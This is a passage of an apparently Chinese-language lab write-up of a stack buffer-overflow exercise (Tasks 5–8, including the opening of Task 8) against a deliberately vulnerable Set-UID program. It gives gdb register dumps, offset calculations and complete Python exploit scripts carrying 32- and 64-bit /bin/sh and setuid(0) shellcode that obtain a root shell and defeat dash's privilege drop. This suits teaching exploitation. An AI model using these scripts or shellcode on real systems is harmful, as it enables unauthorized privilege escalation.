(ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) * (<span class="hljs-number">204</span>//<span class="hljs-number">4</span>) <span class="hljs-comment">#将前204位全部填充ret</span><br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p>第二次打法成功，两次都可行</p>
+<p>发现成功进入root shell，并且只需要一次，无需爆破。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152315.png" srcset="/img/loading.gif" lazyload alt="image-20251006194023764"></p>
+<h2 id="Task5：对-64-bit-程序实施攻击-Level-3"><a href="#Task5：对-64-bit-程序实施攻击-Level-3" class="headerlink" title="Task5：对 64-bit 程序实施攻击 (Level 3)"></a>Task5：对 64-bit 程序实施攻击 (Level 3)</h2><p>在本任务中，我们将漏洞程序编译为一个称为 stack-L3的64-bit二进制文件。我们将对该程序实施攻击。编译和设置Set-UID命令已经包含在 Makefile文件中。与之前的任务类似，你需要在实验报告中 提供详细的攻击过程。</p>
+<p>对于64-bit 程序，使用 gdb调试的方法与32-bit程序相同。唯一的区别是帧指针寄存器的名称不同。 在x86体系结构中，帧指针寄存器为 ebp，而在x64体系结构中，帧指针寄存器为 rbp。</p>
+<p>挑战 与对32-bit程序的缓冲区溢出攻击相比，对64-bit程序的攻击更难。最难的部分是地址。虽然x64 体系结构支持64-bit地址空间，但是只允许使用 0x00∼0x00007FFFFFFFFFFF 范围内的地址。这意味着每个地址（8个字节）的最高两个字节总是0。这是一个问题。</p>
+<p>在缓冲区溢出攻击中，payload中至少存储一个地址，而且 payload将通过 strcpy()函数复制到 栈上，但是 strcpy()函数一遇到”0”就会停止复制。因此，如果 payload中间包含”0”，则”0”之后的 内容不能复制到栈上。如何解决这个问题是本次攻击中最困难的挑战。</p>
+<p>解释一下，由于程序是通过<code>strcpy()</code>将badfile读取到buffer里的，因此我们的shellcode中不能出现<code>\x00</code>，因为这样会导致strcpy截断，同时写入的返回地址的前两位总是<code>00</code>，由于地址在栈中是以小端序存储的，因此我们只要将返回地址写到badfile的最后位置就行，这样就可以读取到完整的shellcode。</p>
+<p>首先使用gdb调试获取缓冲区起始地址和函数返回地址：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">next</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffdda0 --&gt; 0xffffcc1cffffcc1c <br>RBX: 0x555555555360 (&lt;__libc_csu_init&gt;:	endbr64)<br>RCX: 0x7fffffffdd00 --&gt; 0x0 <br>RDX: 0x7fffffffdd00 --&gt; 0x0 <br>RSI: 0x0 <br>RDI: 0x7fffffffdda0 --&gt; 0xffffcc1cffffcc1c <br>RBP: 0x7fffffffd970 --&gt; 0x7fffffffdd80 --&gt; 0x7fffffffdfc0 --&gt; 0x0 <br>RSP: 0x7fffffffd870 --&gt; 0x7fffffffdd00 --&gt; 0x0 <br>RIP: 0x55555555523f (&lt;bof+22&gt;:	mov    rdx,QWORD PTR [rbp-0xf8])<br>R8 : 0x0 <br>R9 : 0x10 <br>R10: 0x55555555602c --&gt; 0x52203d3d3d3d000a (&#x27;\n&#x27;)<br>R11: 0x246 <br>R12: 0x555555555140 (&lt;_start&gt;:	endbr64)<br>R13: 0x7fffffffe0b0 --&gt; 0x1 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x55555555522e &lt;bof+5&gt;:	mov    rbp,rsp<br>   0x555555555231 &lt;bof+8&gt;:	sub    rsp,0x100<br>   0x555555555238 &lt;bof+15&gt;:	mov    QWORD PTR [rbp-0xf8],rdi<br>=&gt; 0x55555555523f &lt;bof+22&gt;:	mov    rdx,QWORD PTR [rbp-0xf8]<br>   0x555555555246 &lt;bof+29&gt;:	lea    rax,[rbp-0xf0]<br>   0x55555555524d &lt;bof+36&gt;:	mov    rsi,rdx<br>   0x555555555250 &lt;bof+39&gt;:	mov    rdi,rax<br>   0x555555555253 &lt;bof+42&gt;:	call   0x5555555550c0 &lt;strcpy@plt&gt;<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffd870 --&gt; 0x7fffffffdd00 --&gt; 0x0 <br>0008| 0x7fffffffd878 --&gt; 0x7fffffffdda0 --&gt; 0xffffcc1cffffcc1c <br>0016| 0x7fffffffd880 --&gt; 0xffffffff <br>0024| 0x7fffffffd888 --&gt; 0x7ffff7fe0187 (mov    r8,rax)<br>0032| 0x7fffffffd890 --&gt; 0x7ffff7fcf6b8 --&gt; 0xe0012000000bc <br>0040| 0x7fffffffd898 --&gt; 0x7ffff7ffd9e8 --&gt; 0x7ffff7fcf000 --&gt; 0x10102464c457f <br>0048| 0x7fffffffd8a0 --&gt; 0x300000000 <br>0056| 0x7fffffffd8a8 --&gt; 0x7ffff7fcf628 --&gt; 0xe001200000021 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>20	    strcpy(buffer, str);       <br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p <span class="hljs-variable">$rbp</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">1 = (void *) 0x7fffffffd970</span><br><span class="hljs-meta prompt_">gdb-peda$ </span><span class="language-bash">p &amp;buffer</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">2 = (char (*)[240]) 0x7fffffffd880</span><br><span class="hljs-meta prompt_">gdb-peda$ </span><br></code></pre></td></tr></table></figure>
+
+<p>计算偏移：</p>
+<p>0x7fffffffd970 - 0x7fffffffd880 + 8，结果为248</p>
+<p>因此我们需要把shellcode写到248之前，而且shellcode长度为30</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152173.png" srcset="/img/loading.gif" lazyload alt="image-20251006201126531"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">64</span>              <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br></code></pre></td></tr></table></figure>
+
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br>  <span class="hljs-string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span><br>  <span class="hljs-string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span><br>  <span class="hljs-string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">64</span>              <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    =  <span class="hljs-number">0x7fffffffd880</span> + start         <span class="hljs-comment"># Change this number </span><br>offset =  <span class="hljs-number">0x7fffffffd970</span> - <span class="hljs-number">0x7fffffffd880</span> + <span class="hljs-number">8</span>              <span class="hljs-comment"># Change this number </span><br><br>L = <span class="hljs-number">8</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br>content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p>攻击效果：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152609.png" srcset="/img/loading.gif" lazyload alt="image-20251006204825095"></p>
+<p>攻击成功，拿到root shell。</p>
+<h2 id="Task6：对-64-bit-程序实施攻击-Level-4"><a href="#Task6：对-64-bit-程序实施攻击-Level-4" class="headerlink" title="Task6：对 64-bit 程序实施攻击 (Level 4)"></a>Task6：对 64-bit 程序实施攻击 (Level 4)</h2><p>本任务的缓冲区大小只有10。</p>
+<p>先使用gdb找到缓冲区起始地址和函数返回地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb-peda$ p <span class="hljs-variable">$rbp</span><br><span class="hljs-variable">$3</span> = (void *) 0x7fffffffd940<br>gdb-peda$ p &amp;buffer<br><span class="hljs-variable">$2</span> = (char (*)[10]) 0x7fffffffd936<br></code></pre></td></tr></table></figure>
+
+<p>由于缓冲区太小，放不下我们的shellcode，于是我们可以利用main函数里的<code>char str[517]</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!badfile) &#123;<br>       perror(<span class="hljs-string">&quot;Opening badfile&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-type">int</span> length = fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input size: %d\n&quot;</span>, length);<br>    dummy_function(str);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;==== Returned Properly ====\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以这里我们继续运行，找到mian函数的<code>char str[517]</code>(也可以在main函数下断点，然后当<code>str</code>入栈时，查看shellcode的地址)</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152695.png" srcset="/img/loading.gif" lazyload alt="image-20251006215934220"></p>
+<p>于是将<code>ret</code>的值设为<code>0x7fffffffdd70 + start</code> </p>
+<p>此时注意，由于offset的值是<code>offset =  0x7fffffffd940 - 0x7fffffffd936 + 8</code>，也就是18，而且后面又要写上</p>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br>  <span class="hljs-string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span><br>  <span class="hljs-string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span><br>  <span class="hljs-string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">128</span>             <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    =  <span class="hljs-number">0x7fffffffdd70</span> + start         <span class="hljs-comment"># Change this number </span><br>offset =  <span class="hljs-number">0x7fffffffd940</span> - <span class="hljs-number">0x7fffffffd936</span> + <span class="hljs-number">8</span>              <span class="hljs-comment"># Change this number </span><br><br>L = <span class="hljs-number">8</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br>content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p>执行结果：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152696.png" srcset="/img/loading.gif" lazyload alt="image-20251006223035618"></p>
+<h2 id="Task7：攻破-dash-的保护机制"><a href="#Task7：攻破-dash-的保护机制" class="headerlink" title="Task7：攻破 dash 的保护机制"></a>Task7：攻破 dash 的保护机制</h2><p>当Ubuntu 操作系统中的 dash shell检测到有效UID不同于真实UID时（Set-UID程序中），就会主 动放弃特权。这是通过将有效UID修改为真实UID来实现的，本质上就是放弃特权。在前面的任务中， 我们让&#x2F;bin&#x2F;sh指向了另一种没有这种保护机制的 zsh shell。在本任务中，我们让&#x2F;bin&#x2F;sh指向原来 的&#x2F;bin&#x2F;dash 并攻破这种保护机制。请执行以下操作，让&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;dash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -sf /bin/dash /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>为了攻破缓冲区溢出攻击中的这种保护机制，我们所需要做的就是改变真实UID，让它与有效UID等 价。当以 root为所有者的Set-UID程序运行时，有效UID为0，所以在我们调用 shell程序之前，我们 只需要将真实UID修改为0即可。我们可以通过在 shellcode中执行 execve()之前调用 setuid(0)来 实现这一点。</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>下面的汇编代码展示了如何调用 setuid(0)。相关二进制代码放在 call_shellcode.c文件中。你 只需要将它添加到 shellcode代码开头即可。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix">; Invoke setuid(<span class="hljs-number">0</span>): <span class="hljs-number">3</span>2-bit<br>xor ebx, ebx ; <span class="hljs-attr">ebx</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>: setuid()&#x27;s argument<br>xor eax, eax<br>mov al, <span class="hljs-number">0</span>xd5 ; setuid()&#x27;s system call number<br>int <span class="hljs-number">0</span>x80<br><br>; Invoke setuid(<span class="hljs-number">0</span>): <span class="hljs-number">6</span>4-bit<br>xor rdi, rdi ; <span class="hljs-attr">rdi</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>: setuid()&#x27;s argument<br>xor rax, rax<br>mov al, <span class="hljs-number">0</span>x69 ; setuid()&#x27;s system call number<br>syscall<br><br><span class="hljs-operator">//</span> Binary code for setuid(<span class="hljs-number">0</span>) <br><span class="hljs-operator">//</span> <span class="hljs-number">6</span>4-<span class="hljs-params">bit:</span>  <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>48<span class="hljs-char escape_">\x</span>31<span class="hljs-char escape_">\x</span>ff<span class="hljs-char escape_">\x</span>48<span class="hljs-char escape_">\x</span>31<span class="hljs-char escape_">\x</span>c0<span class="hljs-char escape_">\x</span>b0<span class="hljs-char escape_">\x</span>69<span class="hljs-char escape_">\x</span>0f<span class="hljs-char escape_">\x</span>05&quot;</span><br><span class="hljs-operator">//</span> <span class="hljs-number">3</span>2-<span class="hljs-params">bit:</span>  <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>31<span class="hljs-char escape_">\x</span>db<span class="hljs-char escape_">\x</span>31<span class="hljs-char escape_">\x</span>c0<span class="hljs-char escape_">\x</span>b0<span class="hljs-char escape_">\x</span>d5<span class="hljs-char escape_">\x</span>cd<span class="hljs-char escape_">\x</span>80&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将call_shellcode.c编译为以 root为所有者的二进制文件（通过输入”make setuid”命令）。 在不调用 setuid(0)的情况下运行 a32.out和 a64.out，然后在调用 setuid(0)的情况下再次运行 a32.out 和 a64.out。</p>
+<p>输入<code>make setuid</code>将<code>call_shellcode.c</code>编译为root所有的二进制文件，不调用<code>setuid(0)</code>的时候：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152931.png" srcset="/img/loading.gif" lazyload alt="image-20251006223249524"></p>
+<p>可以发现由于<code>/bin/dash</code>的防护机制，执行shellcode后并没有进入 root shell。</p>
+<p>现在修改<code>call_shellcode.c</code>，调用<code>setuid(0)</code>：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152769.png" srcset="/img/loading.gif" lazyload alt="image-20251006224059566"></p>
+<p>发现成功获取 root shell</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152023.png" srcset="/img/loading.gif" lazyload alt="image-20251006224005383"></p>
+<h3 id="再次实施攻击"><a href="#再次实施攻击" class="headerlink" title="再次实施攻击"></a>再次实施攻击</h3><p>再次实施攻击 现在，使用更新的 shellcode并打开 shell的安全机制，我们可以再次尝试攻击漏洞程 序。对 Level 1重新进行攻击，观察是否可以获得 root shell。在获得 root shell之后，请运行下面 的命令证明安全机制已经打开。虽然不要求对 Level 2和 Level 3重新进行攻击，但是你可以自行尝试 并观察攻击是否有效。</p>
+<p><code>bin/dash</code>通过检测当前进程的<code>euid</code>是不是和<code>uid</code>相同，如果检测到不同，就会主动放弃特权，导致我们拿不到root shell，我们先使用之前32位的exp试试：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152407.png" srcset="/img/loading.gif" lazyload alt="image-20251006225151976"></p>
+<p>发现确实没有拿到root shell。</p>
+<p>于是我们修改我们的shellcode，在前面加入以下汇编的机器码：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152511.png" srcset="/img/loading.gif" lazyload alt="image-20251006230044546"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br>  <span class="hljs-string">&quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span>  <span class="hljs-comment">#setuid(0)</span><br>  <span class="hljs-string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span><br>  <span class="hljs-string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span><br>  <span class="hljs-string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">400</span>               <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    = <span class="hljs-number">0xffffca7c</span> + start             <span class="hljs-comment"># Change this number </span><br>offset = <span class="hljs-number">0xffffcae8</span> - <span class="hljs-number">0xffffca7c</span> + <span class="hljs-number">4</span>    <span class="hljs-comment"># Change this number </span><br><br>L = <span class="hljs-number">4</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br>content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br><br></code></pre></td></tr></table></figure>
+
+<p>写入并执行，成功拿到root shell：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152992.png" srcset="/img/loading.gif" lazyload alt="image-20251006230102459"></p>
+<p>64bit为：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Replace the content with the actual shellcode</span><br>shellcode= (<br>  <span class="hljs-string">&quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span> <span class="hljs-comment">#setuid(0)</span><br>  <span class="hljs-string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span><br>  <span class="hljs-string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span><br>  <span class="hljs-string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># Put the shellcode somewhere in the payload</span><br>start = <span class="hljs-number">64</span>              <span class="hljs-comment"># Change this number </span><br>content[start:start + <span class="hljs-built_in">len</span>(shellcode)] = shellcode<br><br><span class="hljs-comment"># Decide the return address value </span><br><span class="hljs-comment"># and put it somewhere in the payload</span><br>ret    =  <span class="hljs-number">0x7fffffffd880</span> + start         <span class="hljs-comment"># Change this number </span><br>offset =  <span class="hljs-number">0x7fffffffd970</span> - <span class="hljs-number">0x7fffffffd880</span> + <span class="hljs-number">8</span>              <span class="hljs-comment"># Change this number </span><br><br>L = <span class="hljs-number">8</span>     <span class="hljs-comment"># Use 4 for 32-bit address and 8 for 64-bit address</span><br>content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152531.png" srcset="/img/loading.gif" lazyload alt="image-20251006230232404"></p>
+<h2 id="Task8：攻破地址随机化"><a href="#Task8：攻破地址随机化" class="headerlink" title="Task8：攻破地址随机化"></a>Task8：攻破地址随机化</h2><p>在32-bit Linux 机器上，栈的可用熵为19比特，意味着栈的基地址有219 &#x3D;524,288种可能性。这个 数字并不是很大，可以很容易地使用暴力方法穷举。在本任务中，我们使用这种方法来攻破32-bitVM上 的地址随机化安全机制。首先我们使用以下命令打开Ubuntu的地址随机化，然后对 stack-L1实施相同 的攻击。</p>
